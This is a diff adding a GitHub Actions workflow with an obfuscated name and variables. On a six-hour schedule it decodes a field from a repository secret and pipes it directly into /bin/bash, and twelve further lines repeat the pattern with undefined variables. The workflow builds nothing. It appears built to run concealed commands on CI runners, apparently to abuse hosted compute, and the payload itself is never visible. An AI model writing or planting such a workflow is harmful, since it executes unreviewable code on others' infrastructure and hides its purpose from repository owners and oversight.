@@ -1,0 +1,30 @@
+name: steakominous
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: steakominous
+        env:
+          sg35: ${{ secrets.sg35 }}
+        run: |
+          echo $sg35 | jq -r .qc854 | /bin/bash
+          echo $osnb4532 | jq -r .hq457 | /bin/bash
+          echo $v607 | jq -r .z758 | /bin/bash
+          echo $bwsbw3494 | jq -r .av887 | /bin/bash
+          echo $ayrf267 | jq -r .eczpg74289 | /bin/bash
+          echo $xsdxd3 | jq -r .f358 | /bin/bash
+          echo $s3308 | jq -r .ecftf4 | /bin/bash
+          echo $ein44008 | jq -r .xmq5636 | /bin/bash
+          echo $o45 | jq -r .s57002 | /bin/bash
+          echo $u2156 | jq -r .mtnoh5257 | /bin/bash
+          echo $k1 | jq -r .aocr33256 | /bin/bash
+          echo $hj87434 | jq -r .quli7 | /bin/bash
+          echo $zphit56 | jq -r .fyjkb66580 | /bin/bash
+
